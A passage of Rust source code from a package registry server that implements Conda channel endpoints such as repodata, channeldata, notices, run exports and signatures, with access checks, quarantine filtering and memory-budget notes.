    auth: Extension<Option<AuthExtension>>,
    Path((_token, repo_key, subdir, filename)): Path<(String, String, String, String)>,
    ctx: crate::api::middleware::download_telemetry::DownloadContext,
) -> Result<Response, Response> {
    download_package(state, auth, Path((repo_key, subdir, filename)), ctx).await
}

// ---------------------------------------------------------------------------
// Repository resolution
// ---------------------------------------------------------------------------

async fn resolve_conda_repo(db: &sqlx::PgPool, repo_key: &str) -> Result<RepoInfo, Response> {
    proxy_helpers::resolve_repo_by_key(db, repo_key, &["conda", "conda_native"], "a Conda").await
}

/// Check that the caller has read access to a repository.
///
/// Public repositories allow unauthenticated access. Private repositories
/// require valid credentials via the middleware-provided auth extension.
/// Returns 401 with `WWW-Authenticate: Basic` if access is denied.
async fn check_read_access(
    db: &sqlx::PgPool,
    auth: Option<AuthExtension>,
    repo: &RepoInfo,
) -> Result<(), Response> {
    // Use a runtime query (not the sqlx::query! macro) to avoid offline cache changes
    use sqlx::Row;
    let is_public: bool = sqlx::query("SELECT is_public FROM repositories WHERE id = $1")
        .bind(repo.id)
        .fetch_one(db)
        .await
        .map(|row| row.get::<bool, _>("is_public"))
        .unwrap_or(false);

    if is_public {
        return Ok(());
    }
    // Private repo: require authentication
    require_auth_basic(auth, "conda").map(|_| ())
}

/// Authenticate using a URL path token.
///
/// The token is treated as an API token/access token. It's passed as the
/// password in a pseudo-Basic auth flow (the username is "token").
async fn authenticate_with_token(
    db: &sqlx::PgPool,
    config: &crate::config::Config,
    token: &str,
) -> Result<uuid::Uuid, Response> {
    let auth_service = AuthService::new(db.clone(), Arc::new(config.clone()));
    let (user, _tokens) = auth_service
        .authenticate("token", token)
        .await
        .map_err(|_| {
            Response::builder()
                .status(StatusCode::UNAUTHORIZED)
                .header("WWW-Authenticate", "Basic realm=\"conda\"")
                .body(Body::from("Invalid token"))
                .unwrap()
        })?;

    Ok(user.id)
}

// ---------------------------------------------------------------------------
// Artifact query helper
// ---------------------------------------------------------------------------

#[allow(dead_code)]
struct CondaArtifact {
    id: uuid::Uuid,
    path: String,
    name: String,
    version: Option<String>,
    size_bytes: i64,
    checksum_sha256: String,
    storage_key: String,
    metadata: Option<serde_json::Value>,
}

/// Row shape for [`list_conda_artifacts`]. Runtime-checked (not the `query!`
/// macro) so the quarantine columns need no `.sqlx` metadata regeneration
/// (#4092) — the same trade-off [`list_removed_artifacts`] already makes.
#[derive(sqlx::FromRow)]
struct CondaArtifactRow {
    id: uuid::Uuid,
    path: String,
    name: String,
    version: Option<String>,
    size_bytes: i64,
    checksum_sha256: String,
    storage_key: String,
    metadata: Option<serde_json::Value>,
    quarantine_status: Option<String>,
    quarantine_until: Option<chrono::DateTime<chrono::Utc>>,
}

/// Whether an artifact is withdrawn from the channel: the exact predicate the
/// download gate blocks on (`quarantine_service::check_download_allowed`),
/// read as a boolean. Repodata generation and the `removed` array both filter
/// through this one function, so a package the download path refuses is never
/// advertised — and an expired upload hold, which the gate serves again, stays
/// listed (#4059).
fn is_withdrawn(
    quarantine_status: Option<&str>,
    quarantine_until: Option<chrono::DateTime<chrono::Utc>>,
    now: chrono::DateTime<chrono::Utc>,
) -> bool {
    crate::services::quarantine_service::check_download_allowed(
        quarantine_status,
        quarantine_until,
        now,
    )
    .is_err()
}

async fn list_conda_artifacts(
    db: &sqlx::PgPool,
    repo_id: uuid::Uuid,
) -> Result<Vec<CondaArtifact>, Response> {
    let rows = sqlx::query_as::<_, CondaArtifactRow>(
        r#"
        SELECT a.id, a.path, a.name, a.version, a.size_bytes, a.checksum_sha256,
               a.storage_key, am.metadata, a.quarantine_status, a.quarantine_until
        FROM artifacts a
        LEFT JOIN artifact_metadata am ON am.artifact_id = a.id
        WHERE a.repository_id = $1 AND a.is_deleted = false
        ORDER BY a.created_at DESC
        "#,
    )
    .bind(repo_id)
    .fetch_all(db)
    .await
    .map_err(|e| {
        tracing::error!("Database error listing conda artifacts: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    // #4059: every repodata variant (repodata.json, current_repodata, the
    // bz2/zst/sig encodings, JLAP, CEP-16 shards, run_exports, channeldata)
    // is built from THIS listing, so the withdrawal filter lives here and
    // only here — one predicate, no per-endpoint copies to drift.
    let now = chrono::Utc::now();
    Ok(rows
        .into_iter()
        .filter(|r| !is_withdrawn(r.quarantine_status.as_deref(), r.quarantine_until, now))
        .map(|r| CondaArtifact {
            id: r.id,
            path: r.path,
            name: r.name,
            version: r.version,
            size_bytes: r.size_bytes,
            checksum_sha256: r.checksum_sha256,
            storage_key: r.storage_key,
            metadata: r.metadata,
        })
        .collect())
}

/// Filter artifacts that belong to a given subdir based on metadata or path prefix.
fn artifacts_for_subdir<'a>(
    artifacts: &'a [CondaArtifact],
    subdir: &str,
) -> Vec<&'a CondaArtifact> {
    artifacts
        .iter()
        .filter(|a| {
            // Check metadata first
            if let Some(ref meta) = a.metadata {
                if let Some(s) = meta.get("subdir").and_then(|v| v.as_str()) {
                    return s == subdir;
                }
            }
            // Fall back to path prefix
            a.path.starts_with(&format!("{}/", subdir))
        })
        .collect()
}

/// Determine if a filename is a .conda (v2) or .tar.bz2 (v1) package.
fn is_conda_v2(filename: &str) -> bool {
    filename.ends_with(".conda")
}

fn is_conda_package(filename: &str) -> bool {
    filename.ends_with(".conda") || filename.ends_with(".tar.bz2")
}

/// Extract and sanitize the upload filename from Content-Disposition or
/// X-Package-Filename headers. Strips trailing RFC 6266 parameters after `;`
/// and rejects path traversal sequences.
#[allow(clippy::result_large_err)]
fn extract_upload_filename(headers: &HeaderMap) -> Result<String, Response> {
    let raw = headers
        .get("Content-Disposition")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| {
            v.split("filename=").nth(1).map(|f| {
                // Strip trailing parameters (e.g., "; other=value")
                let f = f.split(';').next().unwrap_or(f);
                f.trim_matches('"').trim_matches('\'').trim().to_string()
            })
        })
        .or_else(|| {
            headers
                .get("X-Package-Filename")
                .and_then(|v| v.to_str().ok())
                .map(|s| s.to_string())
        })
        .ok_or_else(|| {
            (
                StatusCode::BAD_REQUEST,
                "Missing filename: provide Content-Disposition or X-Package-Filename header",
            )
                .into_response()
        })?;

    // Reject path traversal and null bytes
    if raw.contains("..") || raw.contains('/') || raw.contains('\\') || raw.contains('\0') {
        return Err((
            StatusCode::BAD_REQUEST,
            "Filename contains path traversal sequences",
        )
            .into_response());
    }

    Ok(raw)
}

// ---------------------------------------------------------------------------
// The persisted-metadata contract (#4038)
// ---------------------------------------------------------------------------
//
// `channeldata.json` and `run_exports.json` serve fields out of a hosted
// package's `artifact_metadata.metadata` document. Those endpoints used to read
// keys the upload path never wrote, so every hosted package served
// `{"run_exports": {}}` and a channeldata entry with no summary, home or
// source_url. The write path (`build_conda_metadata`) and the read paths below
// now share these declarations, so they cannot drift apart again.

/// The `artifact_metadata.metadata` keys `channeldata.json` reads back.
const CHANNELDATA_METADATA_KEYS: [&str; 8] = [
    "license",
    "license_family",
    "description",
    "summary",
    "home",
    "doc_url",
    "dev_url",
    "source_url",
];

/// The `artifact_metadata.metadata` key `run_exports.json` reads back.
const RUN_EXPORTS_METADATA_KEY: &str = "run_exports";

/// Normalise a package's `info/run_exports.json` to the CEP-12 dict shape.
/// A recipe may declare `run_exports` as a bare list of specs, which
/// conda-build defines as weak exports — its own `write_run_exports` rewrites
/// the list as `{"weak": [...]}` before writing the package — and packages
/// built before conda-build did so carry the list verbatim. The per-package
/// member of the served `run_exports.json` must be a dict, so the list is
/// rewritten at ingest and again at read, which also corrects rows persisted
/// while the list was stored verbatim. A dict passes through untouched.
fn normalize_run_exports(value: serde_json::Value) -> serde_json::Value {
    match value {
        serde_json::Value::Array(specs) => serde_json::json!({ "weak": specs }),
        dict => dict,
    }
}

/// Read a package's run exports out of its persisted metadata, as
/// `run_exports.json` serves them. A package that declares none serves `{}`.
fn package_run_exports(metadata: Option<&serde_json::Value>) -> serde_json::Value {
    metadata
        .and_then(|m| m.get(RUN_EXPORTS_METADATA_KEY))
        .cloned()
        .map(normalize_run_exports)
        .unwrap_or_else(|| serde_json::json!({}))
}

/// Fill any still-unset channeldata field from one artifact's persisted
/// metadata. Packages are visited newest-first, so the first non-empty value
/// wins and later (older) builds do not overwrite it.
fn merge_channeldata_fields(
    fields: &mut BTreeMap<&'static str, String>,
    metadata: &serde_json::Value,
) {
    for key in CHANNELDATA_METADATA_KEYS {
        if fields.contains_key(key) {
            continue;
        }
        if let Some(value) = metadata.get(key).and_then(|v| v.as_str()) {
            if !value.is_empty() {
                fields.insert(key, value.to_string());
            }
        }
    }
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/channeldata.json
// ---------------------------------------------------------------------------

async fn channeldata_json(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;

    check_read_access(&state.db, auth.clone(), &repo).await?;

    // Virtual repos: merge channeldata from all members
    if repo.repo_type == RepositoryType::Virtual {
        let channeldata = build_virtual_channeldata(
            &state.db,
            auth.as_ref(),
            state.proxy_service.as_deref(),
            repo.id,
        )
        .await?;
        let body = serde_json::to_string_pretty(&channeldata)
            .unwrap()
            .into_bytes();
        return Ok(cacheable_response(body, "application/json", &headers).await);
    }

    // For remote repos, proxy channeldata from upstream.
    //
    // #2915: two problems this branch used to have, both fixed the same way
    // `serve_repodata` fixed them:
    //
    //  * The 8 MiB DEFAULT tier is far too small — conda-forge's
    //    `channeldata.json` is a single document describing every package in
    //    the channel and comfortably exceeds it — so the capped fetch ALWAYS
    //    errored for the channel this endpoint matters most for.
    //  * The error was then swallowed by `if let Ok(..)`, falling through to
    //    the DB-only document below. For a freshly created Remote repo that is
    //    an EMPTY channeldata served with 200, which a client reads as
    //    authoritative ("this channel has no packages") instead of as the
    //    upstream failure it actually is. Propagate with `?`.
    //
    // The LARGE tier is reserved against the process-wide buffered-metadata
    // budget (#2684) because this endpoint is anonymously reachable on a public
    // repo: the per-request cap bounds ONE buffer at 128 MiB, and only the
    // budget bounds the SUM of concurrent buffers.
    if repo.repo_type == RepositoryType::Remote {
        if let Some(ref upstream_url) = repo.upstream_url {
            if let Some(ref proxy) = state.proxy_service {
                let (content, _ct, upstream_encoding, _budget_permit) =
                    proxy_helpers::proxy_fetch_capped_budgeted_with_encoding(
                        proxy,
                        repo.id,
                        &repo_key,
                        upstream_url,
                        "channeldata.json",
                        proxy_helpers::LARGE_METADATA_MAX_BYTES,
                    )
                    .await?;
                // `_budget_permit` is held until this function returns, i.e.
                // across response construction (including the gzip pass), which
                // is the window where the buffer is resident AND being copied.
                // Same lifetime as the debian dists path (#2684).
                return Ok(cacheable_response_coded(
                    content,
                    "application/json",
                    upstream_encoding.as_deref(),
                    &headers,
                )
                .await);
            }
        }
    }

    let artifacts = list_conda_artifacts(&state.db, repo.id).await?;

    // Query for the latest version of each package (ordered by created_at DESC,
    // so the first row per name is the latest).
    let latest_versions: BTreeMap<String, String> = {
        let rows = sqlx::query!(
            r#"
            SELECT DISTINCT ON (a.name) a.name, a.version
            FROM artifacts a
            WHERE a.repository_id = $1 AND a.is_deleted = false
            ORDER BY a.name, a.created_at DESC
            "#,
            repo.id
        )
        .fetch_all(&state.db)
        .await
        .map_err(|e| {
            tracing::error!("Database error querying channeldata: {}", e);
            (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
        })?;

        rows.into_iter()
            .filter_map(|r| r.version.map(|v| (r.name, v)))
            .collect()
    };

    // Collect all packages with their subdirs and metadata
    struct ChanneldataEntry {
        subdirs: BTreeSet<String>,
        /// The `CHANNELDATA_METADATA_KEYS` fields resolved for this package.
        fields: BTreeMap<&'static str, String>,
    }

    let mut packages: BTreeMap<String, ChanneldataEntry> = BTreeMap::new();

    for artifact in &artifacts {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        if !is_conda_package(filename) {
            continue;
        }

        let subdir = artifact
            .metadata
            .as_ref()
            .and_then(|m| m.get("subdir").and_then(|v| v.as_str()))
            .map(|s| s.to_string())
            .or_else(|| artifact.path.split('/').next().map(|s| s.to_string()))
            .unwrap_or_else(|| "noarch".to_string());

        let pkg_name = artifact
            .metadata
            .as_ref()
            .and_then(|m| m.get("name").and_then(|v| v.as_str()))
            .map(|s| s.to_string())
            .unwrap_or_else(|| artifact.name.clone());

        let entry = packages
            .entry(pkg_name)
            .or_insert_with(|| ChanneldataEntry {
                subdirs: BTreeSet::new(),
                fields: BTreeMap::new(),
            });
        entry.subdirs.insert(subdir);

        // Populate metadata from the most recently seen artifact with data
        if let Some(ref meta) = artifact.metadata {
            merge_channeldata_fields(&mut entry.fields, meta);
        }
    }

    let packages_json: serde_json::Map<String, serde_json::Value> = packages
        .into_iter()
        .map(|(name, entry)| {
            let version = latest_versions.get(&name).cloned().unwrap_or_default();
            let subdirs: Vec<String> = entry.subdirs.into_iter().collect();
            let mut val = build_channeldata_package_entry(&subdirs, &version);
            // Include optional fields when available
            for (key, value) in entry.fields {
                val[key] = serde_json::Value::String(value);
            }
            (name, val)
        })
        .collect();

    let channeldata = build_channeldata_json(&packages_json);

    let body = serde_json::to_string_pretty(&channeldata)
        .unwrap()
        .into_bytes();

    Ok(cacheable_response(body, "application/json", &headers).await)
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/notices.json (CEP-6)
// ---------------------------------------------------------------------------

/// Channel notices endpoint (CEP-6).
///
/// Returns channel-level notifications displayed to users during
/// install/update operations. Used for deprecation warnings, security
/// advisories, and maintenance notices.
///
/// Notices are persisted per repository in `repository_config` under
/// [`CHANNEL_NOTICES_CONFIG_KEY`] as a JSON array (#4059) — reusing the
/// existing per-repo key/value store keeps this off the migration path
/// (#4092). Package withdrawals append here; clients poll this endpoint.
async fn notices_json(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Path(repo_key): Path<String>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;

    let stored = load_channel_notices(&state.db, repo.id).await;
    let notices = serde_json::json!({ "notices": stored });

    let body = serde_json::to_vec_pretty(&notices).unwrap();
    Ok(cacheable_response(body, "application/json", &headers).await)
}

/// `repository_config` key holding a conda channel's CEP-6 notices as a JSON
/// array of `{id, message, level, created_at, ...}` objects (#4059).
const CHANNEL_NOTICES_CONFIG_KEY: &str = "conda_channel_notices";

/// Read the stored CEP-6 notices for a repository. A missing or malformed
/// value yields an empty list — a corrupt notice blob must never 500 the
/// client-facing notices endpoint.
async fn load_channel_notices(db: &sqlx::PgPool, repo_id: uuid::Uuid) -> Vec<serde_json::Value> {
    let raw: Option<String> = sqlx::query_scalar::<_, Option<String>>(
        "SELECT value FROM repository_config WHERE repository_id = $1 AND key = $2",
    )
    .bind(repo_id)
    .bind(CHANNEL_NOTICES_CONFIG_KEY)
    .fetch_optional(db)
    .await
    .ok()
    .flatten()
    .flatten();

    raw.and_then(|v| serde_json::from_str::<serde_json::Value>(&v).ok())
        .and_then(|v| v.as_array().cloned())
        .unwrap_or_default()
}

/// Append one CEP-6 notice to the channel's stored list (#4059).
async fn append_channel_notice(
    db: &sqlx::PgPool,
    repo_id: uuid::Uuid,
    notice: serde_json::Value,
) -> Result<(), Response> {
    let mut notices = load_channel_notices(db, repo_id).await;
    notices.push(notice);
    let serialized = serde_json::to_string(&notices).map_err(|e| {
        tracing::error!("Failed to serialize channel notices: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    sqlx::query(
        "INSERT INTO repository_config (repository_id, key, value) VALUES ($1, $2, $3) \
         ON CONFLICT (repository_id, key) \
         DO UPDATE SET value = EXCLUDED.value, updated_at = NOW()",
    )
    .bind(repo_id)
    .bind(CHANNEL_NOTICES_CONFIG_KEY)
    .bind(serialized)
    .execute(db)
    .await
    .map_err(|e| {
        tracing::error!("Failed to persist channel notice: {}", e);
        (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
    })?;

    Ok(())
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/run_exports.json (CEP-12)
// ---------------------------------------------------------------------------

/// Run exports metadata endpoint (CEP-12).
///
/// Returns run_exports data per package so conda-build can determine
/// runtime dependencies without downloading full packages.
async fn run_exports_json(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    let all_artifacts = list_conda_artifacts(&state.db, repo.id).await?;
    let subdir_artifacts = artifacts_for_subdir(&all_artifacts, &subdir);

    let mut packages = serde_json::Map::new();

    for artifact in &subdir_artifacts {
        let filename = artifact.path.rsplit('/').next().unwrap_or(&artifact.path);
        if !is_conda_package(filename) {
            continue;
        }

        // Extract run_exports from metadata if available. The upload path
        // persists `info/run_exports.json` under the same key (#4038).
        let run_exports = package_run_exports(artifact.metadata.as_ref());

        packages.insert(
            filename.to_string(),
            serde_json::json!({
                "run_exports": run_exports,
            }),
        );
    }

    let response = serde_json::json!({
        "info": { "subdir": subdir },
        "packages": packages,
    });

    let body = serde_json::to_vec_pretty(&response).unwrap();
    Ok(cacheable_response(body, "application/json", &headers).await)
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/patch_instructions.json
// ---------------------------------------------------------------------------

/// Patch instructions endpoint.
///
/// Returns an object of per-package patches that should be applied to
/// repodata.json. Allows channel maintainers to fix dependency metadata,
/// revoke packages, or update license info without re-uploading packages.
///
/// Currently returns an empty patch set. Future: store patch instructions
/// in the database per repository/subdir.
async fn patch_instructions_json(
    State(state): State<SharedState>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    let _repo = resolve_conda_repo(&state.db, &repo_key).await?;

    let response = serde_json::json!({
        "info": { "subdir": subdir },
        "packages": {},
        "packages.conda": {},
        "remove": [],
        "revoke": [],
    });

    let body = serde_json::to_vec_pretty(&response).unwrap();
    Ok(cacheable_response(body, "application/json", &headers).await)
}

// ---------------------------------------------------------------------------
// Repodata encoding helpers
// ---------------------------------------------------------------------------

enum RepodataEncoding {
    Json,
    Bz2,
    Zst,
}

impl RepodataEncoding {
    fn content_type(&self) -> &'static str {
        match self {
            Self::Json => "application/json",
            Self::Bz2 => "application/x-bzip2",
            Self::Zst => "application/zstd",
        }
    }

    fn upstream_filename(&self) -> &'static str {
        match self {
            Self::Json => "repodata.json",
            Self::Bz2 => "repodata.json.bz2",
            Self::Zst => "repodata.json.zst",
        }
    }

    #[allow(clippy::result_large_err)]
    fn encode(&self, repodata: &serde_json::Value) -> Result<Vec<u8>, Response> {
        match self {
            Self::Json => Ok(serde_json::to_string_pretty(repodata).unwrap().into_bytes()),
            Self::Bz2 => {
                let json_bytes = serde_json::to_vec(repodata).unwrap();
                Ok(bzip2_compress(&json_bytes))
            }
            Self::Zst => {
                let json_bytes = serde_json::to_vec(repodata).unwrap();
                zstd_compress(&json_bytes).map_err(|e| {
                    tracing::error!("zstd compression error for repodata: {}", e);
                    (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error").into_response()
                })
            }
        }
    }
}

// ---------------------------------------------------------------------------
// #4051: upstream repodata patch generation attribution
// ---------------------------------------------------------------------------

/// Response header naming the upstream repodata patch generation in effect
/// when a proxied repodata document was served.
///
/// A header rather than an extra top-level key in the repodata document:
/// repodata.json is parsed by conda clients against the CEP schema, and while
/// unknown keys are commonly tolerated, a header cannot perturb the document
/// the client solves against at all. The body is served byte-identical to
/// upstream either way.
const REPDATA_PATCH_GENERATION_HEADER: &str = "x-repodata-patch-generation";

/// Record which upstream repodata patch generation was in effect for a served
/// proxied index, returning it for response attribution (#4051).
///
/// The generation is content-addressed: the BLAKE2b-256 hex of the upstream
/// `{subdir}/patch_instructions.json` bytes as fetched through the proxy.
/// Content addressing (rather than upstream HTTP validators) works across
/// upstreams that do not version their patch documents, and makes both
/// directions of the acceptance property hold by construction: identical
/// content maps to the same generation, changed content to a new one.
///
/// The fetch goes through the same proxy cache as the repodata document
/// itself, so on a cache-hit serve this costs no upstream round trip, and the
/// recorded generation stays coherent with the (possibly cached) index being
/// served.
///
/// Recording is insert-only: a repeat observation writes nothing
/// (`ON CONFLICT DO NOTHING`), so the hot repodata path does not become a
/// per-request UPDATE; a generation CHANGE appears as a new row.
///
/// Best-effort by design: an upstream that does not serve patch instructions
/// (404), a transient upstream failure, or a recording failure must not take
/// down the repodata serve — the response then simply carries no attribution
/// header. Hosted and virtual repos never reach this helper: there is no
/// upstream patch authority behind them to attribute.
///
/// Reserves its own slice of the shared buffered-metadata budget (#2684) and
/// releases it on return, so callers MUST NOT invoke it while already holding
/// a permit from that budget — see the ordering note in [`serve_repodata`]
/// and `conda_repodata_attribution_takes_no_nested_budget_reservation_4129`.
async fn record_upstream_patch_generation(
    state: &SharedState,
    proxy: &crate::services::proxy_service::ProxyService,
    repo_id: uuid::Uuid,
    repo_key: &str,
    upstream_url: &str,
    subdir: &str,
) -> Option<String> {
    let upstream_path = format!("{}/patch_instructions.json", subdir);
    let fetched = proxy_helpers::proxy_fetch_capped_budgeted_with_encoding(
        proxy,
        repo_id,
        repo_key,
        upstream_url,
        &upstream_path,
        proxy_helpers::DEFAULT_METADATA_MAX_BYTES,
    )
    .await;
    let (content, _ct, _encoding, _budget_permit) = match fetched {
        Ok(parts) => parts,
        Err(response) => {
            tracing::warn!(
                status = response.status().as_u16(),
                repo_key,
                subdir,
                "patch generation attribution fetch failed; serving repodata unattributed (#4051)"
            );
            return None;
        }
    };
    let generation = hex::encode(blake2_256(&content));
    if let Err(e) = sqlx::query!(
        r#"
        INSERT INTO conda_repodata_patch_generations (repository_id, subdir, generation)
        VALUES ($1, $2, $3)
        ON CONFLICT DO NOTHING
        "#,
        repo_id,
        subdir,
        generation
    )
    .execute(&state.db)
    .await
    {
        tracing::error!(
            error = %e,
            repo_key,
            subdir,
            "failed to record conda repodata patch generation (#4051)"
        );
    }
    Some(generation)
}

async fn serve_repodata(
    state: &SharedState,
    auth: Option<AuthExtension>,
    headers: &HeaderMap,
    repo_key: &str,
    subdir: &str,
    encoding: RepodataEncoding,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, repo_key).await?;
    check_read_access(&state.db, auth.clone(), &repo).await?;

    let ct = encoding.content_type();

    // Virtual repos: merge repodata from all members
    if repo.repo_type == RepositoryType::Virtual {
        let repodata = build_virtual_repodata(
            &state.db,
            auth.as_ref(),
            state.proxy_service.as_deref(),
            repo.id,
            repo_key,
            subdir,
        )
        .await?;
        let body = encoding.encode(&repodata)?;
        return Ok(cacheable_response(body, ct, headers).await);
    }

    // For remote repos, proxy repodata from upstream. Real conda-forge
    // repodata.json.zst commonly runs 20-30 MiB (e.g. noarch/osx-arm64), well
    // past the 8 MiB DEFAULT_METADATA_MAX_BYTES ceiling used by most other
    // formats' metadata proxying, so this uses the LARGE tier (128 MiB) the
    // same way debian/npm/maven/pypi do for their oversized index documents.
    //
    // A fetch failure here must propagate to the client instead of silently
    // falling through to `build_repodata` below: that fallback only reflects
    // artifacts already cached in our own DB, so masking a real upstream
    // failure (cap exceeded, upstream down, etc.) behind it would serve a
    // valid-looking but empty/incomplete index and make the client believe
    // there are no packages, rather than surfacing the actual problem.
    //
    // #2915: the 128 MiB buffer is reserved against the process-wide
    // buffered-metadata budget (#2684) rather than taken unbudgeted. This
    // endpoint is anonymously reachable on a public repo and re-buffers on every
    // request (cache hits included), so the per-request cap alone bounds one
    // buffer while N concurrent requests could still drive resident memory to
    // N * 128 MiB; the budget bounds the sum. The buffered `Bytes` is then moved
    // straight into the response instead of being copied via `to_vec()`.
    if repo.repo_type == RepositoryType::Remote {
        if let Some(ref upstream_url) = repo.upstream_url {
            if let Some(ref proxy) = state.proxy_service {
                let upstream_path = format!("{}/{}", subdir, encoding.upstream_filename());
                // #4051: attribute the served index to the upstream patch
                // generation in effect at serve time, and record it so an
                // upstream repodata patch revision is visible as a change.
                //
                // This MUST run BEFORE the repodata reservation below, never
                // underneath it. `record_upstream_patch_generation` buffers
                // through the same budgeted helper, so it reserves a SECOND
                // slice (8 MiB) of the SAME process-wide buffered-metadata
                // budget. Taking it while the 128 MiB repodata permit is held
                // is hold-and-wait: the default budget is 1 GiB, i.e. exactly
                // eight `LARGE_METADATA_MAX_BYTES` buffers, so eight
                // concurrent (anonymous, un-rate-limited) repodata requests
                // reserve the whole budget and then each await bytes only the
                // others could release — a permanent deadlock of the shared
                // buffered-metadata path for EVERY format, not just conda
                // (#4129). Sequencing the two fetches keeps a request to one
                // reservation at a time: the attribution permit is released
                // when this call returns, before the repodata permit exists,
                // and the peak reservation stays 128 MiB rather than 136 MiB.
                //
                // The cost of the order is one extra (cached, 8 MiB-capped)
                // attribution lookup when the repodata fetch then fails, which
                // is strictly preferable to a liveness hazard on a budget every
                // format shares.
                let patch_generation = record_upstream_patch_generation(
                    state,
                    proxy,
                    repo.id,
                    repo_key,
                    upstream_url,
                    subdir,
                )
                .await;
                let (content, _ct, upstream_encoding, _budget_permit) =
                    proxy_helpers::proxy_fetch_capped_budgeted_with_encoding(
                        proxy,
                        repo.id,
                        repo_key,
                        upstream_url,
                        &upstream_path,
                        proxy_helpers::LARGE_METADATA_MAX_BYTES,
                    )
                    .await?;
                // `_budget_permit` is held until this function returns, i.e.
                // across response construction (including the gzip pass) — the
                // window where the buffer is both resident and being read.
                // Matches the debian dists path (#2684).
                let mut response =
                    cacheable_response_coded(content, ct, upstream_encoding.as_deref(), headers)
                        .await;
                if let Some(generation) = patch_generation {
                    if let Ok(value) = axum::http::HeaderValue::from_str(&generation) {
                        response
                            .headers_mut()
                            .insert(REPDATA_PATCH_GENERATION_HEADER, value);
                    }
                }
                return Ok(response);
            }
        }
    }

    let repodata = build_repodata(&state.db, repo.id, repo_key, subdir, false).await?;
    let body = encoding.encode(&repodata)?;
    Ok(cacheable_response(body, ct, headers).await)
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/repodata.json
// ---------------------------------------------------------------------------

async fn repodata_json(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    serve_repodata(
        &state,
        auth,
        &headers,
        &repo_key,
        &subdir,
        RepodataEncoding::Json,
    )
    .await
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/repodata.json.bz2
// ---------------------------------------------------------------------------

async fn repodata_json_bz2(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    serve_repodata(
        &state,
        auth,
        &headers,
        &repo_key,
        &subdir,
        RepodataEncoding::Bz2,
    )
    .await
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/repodata.json.sig
// ---------------------------------------------------------------------------

/// Return the raw RSA signature of repodata.json for the given subdir.
///
/// Conda uses raw (non-PGP-armored) signatures. Returns 404 if the repository
/// has no active signing key configured.
async fn repodata_json_sig(
    State(state): State<SharedState>,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    let repo = resolve_conda_repo(&state.db, &repo_key).await?;
    let repodata = build_repodata(&state.db, repo.id, &repo_key, &subdir, false).await?;

    // Use pretty-printed JSON to match what repodata_json() serves,
    // so clients can verify the signature against the downloaded repodata.
    let json_bytes = serde_json::to_string_pretty(&repodata)
        .unwrap()
        .into_bytes();

    let signing_svc = SigningService::new(state.db.clone(), &state.config.jwt_secret);
    let signature = signing_svc
        .sign_data(repo.id, &json_bytes)
        .await
        .map_err(|e| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                format!("Signing error: {}", e),
            )
                .into_response()
        })?;

    match signature {
        Some(sig_bytes) => Ok(Response::builder()
            .status(StatusCode::OK)
            .header(CONTENT_TYPE, "application/octet-stream")
            .header(CONTENT_LENGTH, sig_bytes.len().to_string())
            .body(Body::from(sig_bytes))
            .unwrap()),
        None => Err((
            StatusCode::NOT_FOUND,
            "No signing key configured for this repository",
        )
            .into_response()),
    }
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/repodata.json.zst
// ---------------------------------------------------------------------------

/// Return repodata.json compressed with zstd.
///
/// Modern conda/mamba clients prefer zstd over bz2 for faster decompression.
async fn repodata_json_zst(
    State(state): State<SharedState>,
    Extension(auth): Extension<Option<AuthExtension>>,
    headers: HeaderMap,
    Path((repo_key, subdir)): Path<(String, String)>,
) -> Result<Response, Response> {
    serve_repodata(
        &state,
        auth,
        &headers,
        &repo_key,
        &subdir,
        RepodataEncoding::Zst,
    )
    .await
}

// ---------------------------------------------------------------------------
// GET /conda/{repo_key}/{subdir}/repodata.json.jlap
// ---------------------------------------------------------------------------

/// Return a JLAP (JSON Lines And Patches) file for incremental repodata updates.
///
/// Conda 23.9+ and mamba clients request this endpoint first to check for
/// incremental updates. The JLAP file contains a BLAKE2b-256 checksum chain
/// and RFC 6902 JSON patches that transform old repodata into current.
///
/// Currently serves a "bootstrap" JLAP that communicates the current repodata
/// hash without patches. Clients compare against their cached hash and fall
/// back to a full download when no applicable patches exist.
///
/// Supports HTTP Range requests (`Accept-Ranges: bytes`) so clients can
/// fetch only newly appended lines on subsequent requests.
///
/// Local repos only (#2915). The bootstrap JLAP's footer advertises `latest` =
/// the BLAKE2b hash of the document [`build_repodata`] produces from our own DB
/// rows, and that is only the document `repodata.json` actually serves for a
/// Local repo. For a Remote repo `repodata.json` serves the UPSTREAM document,
/// and for a Virtual repo the aggregation of its members' — so the advertised
